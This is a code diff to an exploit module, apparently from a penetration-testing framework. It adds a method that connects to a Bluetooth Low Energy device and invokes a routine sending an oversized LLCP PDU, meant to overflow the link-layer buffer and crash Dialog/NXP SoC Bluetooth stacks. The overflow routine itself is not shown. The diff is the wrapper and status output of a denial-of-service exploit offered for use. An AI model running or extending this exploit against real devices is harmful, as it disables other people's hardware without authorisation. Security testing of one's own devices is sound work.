@@ -132,7 +132,22 @@ class Exploit(Exploit):
             print_error("bleak not installed: pip install bleak")
             return
 
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: BLE LLCP length overflow on Dialog/NXP SoCs."""
+        target_addr = str(self.target).strip()
+        print_status(f"Phase 1: Connecting to {target_addr} ...")
+        print_status("Phase 2: Sending oversized LLCP PDU to overflow LL buffer ...")
+
         try:
-            asyncio.run(_run_llcp_overflow(target_addr))
+            result = asyncio.run(_run_llcp_overflow(target_addr))
+            if result:
+                print_success(
+                    f"LLCP overflow sent to {target_addr}. "
+                    "Target BLE stack should crash if vulnerable (Dialog/NXP SoC)."
+                )
+            else:
+                print_error("Attack failed.")
         except Exception as exc:
             print_error(f"Attack failed: {exc}")
